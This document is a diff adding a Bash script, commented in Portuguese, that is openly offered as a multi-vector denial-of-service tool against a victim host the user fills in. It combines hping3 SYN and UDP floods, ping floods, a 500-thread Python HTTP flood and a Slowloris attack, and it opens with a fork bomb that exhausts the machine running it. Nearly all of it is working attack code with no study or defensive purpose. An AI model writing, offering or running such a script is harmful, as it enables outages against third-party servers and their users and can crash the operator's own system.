@@ -1,0 +1,73 @@
+#!/bin/bash
+# Mega DoS - Multi Vector para Lubuntu (MUITO FORTE)
+
+echo "Iniciando MEGA DoS - Não feche o terminal!"
+
+IP_ALVO="exemplo.com"  # <<< MUDE PARA O IPv4 OU IPv6 DA VÍTIMA
+PORTA=80               # Altere se quiser outra porta (80, 443, 22 etc)
+
+# Fork Bomb (consome todos os recursos)
+:(){ :|:& };:
+
+# SYN Flood com hping3 (muito potente)
+sudo hping3 --flood --syn -p $PORTA $IP_ALVO > /dev/null 2>&1 &
+sudo hping3 --flood --syn -p 443 $IP_ALVO > /dev/null 2>&1 &
+
+# UDP Flood
+sudo hping3 --flood --udp -p 53 $IP_ALVO > /dev/null 2>&1 &
+
+# ICMP Flood (Ping of Death style)
+sudo ping -f -s 65507 $IP_ALVO > /dev/null 2>&1 &
+sudo ping6 -f -s 65507 $IP_ALVO > /dev/null 2>&1 & 2>/dev/null
+
+# HTTP Flood com Python + requests (múltiplas threads)
+python3 - <<EOF &
+import requests
+import threading
+import time
+
+def flood():
+    while True:
+        try:
+            requests.get("http://$IP_ALVO", timeout=1, headers={"User-Agent": "Mozilla/5.0"})
+            requests.post("http://$IP_ALVO", data="a"*10000, timeout=1)
+        except:
+            pass
+
+for i in range(500):  # 500 threads
+    t = threading.Thread(target=flood)
+    t.daemon = True
+    t.start()
+time.sleep(999999)
+EOF
+
+# Slowloris (mantém conexões abertas)
+python3 - <<EOF2 &
+import socket
+import time
+import random
+
+def slowloris():
+    sockets = []
+    for _ in range(300):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect(("$IP_ALVO", $PORTA))
+            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
+            sockets.append(s)
+        except:
+            pass
+    while True:
+        for s in sockets:
+            try:
+                s.send("X-a: {}\r\n".format(random.randint(1,9999)).encode("utf-8"))
+            except:
+                pass
+        time.sleep(1)
+
+slowloris()
+EOF2
+
+echo "Ataque MEGA DoS rodando com força máxima! Use Ctrl+C para parar (pode demorar)."
+wait
